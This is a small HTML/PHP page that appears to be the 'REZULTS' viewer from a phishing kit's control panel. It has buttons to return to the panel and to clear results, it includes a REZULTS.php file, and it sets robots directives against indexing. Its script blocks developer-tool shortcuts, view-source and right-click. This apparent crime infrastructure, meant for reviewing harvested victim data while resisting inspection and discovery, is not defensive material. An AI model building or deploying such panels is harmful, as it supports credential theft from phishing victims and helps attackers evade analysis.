<!doctype html>
<script>

	document.onkeydown = function(e) {
	  if(event.keyCode == 123) {
	     return false;
	  }
	  if(e.ctrlKey && e.shiftKey && e.keyCode == 'I'.charCodeAt(0)) {
	     return false;
	  }
	  if(e.ctrlKey && e.shiftKey && e.keyCode == 'J'.charCodeAt(0)) {
	     return false;
	  }
	  if(e.ctrlKey && e.keyCode == 'U'.charCodeAt(0)) {
	     return false;
	  }
	}


	
	document.addEventListener('contextmenu', function(e) {
	  e.preventDefault();
	});

</script>
<html>
<link rel="icon" href="../IMG/25759-200.png">
    <head>
        <!-- Required meta tags -->
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
        <meta name="robots" content="noindex," "nofollow," "noimageindex," "noarchive," "nocache," "nosnippet">
        
        <!-- CSS FILES -->
        <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/css/bootstrap.min.css">

        <title>REZULTS</title>
    </head>
<center><form method="post" action="../index.php"><button type="submit" class="btn btn-secondary" name="to" value="success">◀️ BACK TO PANEL</button></form><br</center>
<br>
<center><form method="post" action="CLEAR.php"><button type="submit" class="btn btn-secondary" name="to" value="success">🧹 CLEAR REZULTS</button></form><br</center>
<br>
<?php
$page = $_SERVER['PHP_SELF'];
print "<a href=\"$page\"><b><center>REFRESH 🔃<p></center></b></a>";
    include("REZULTS.php");
$page = $_SERVER['PHP_SELF'];
?>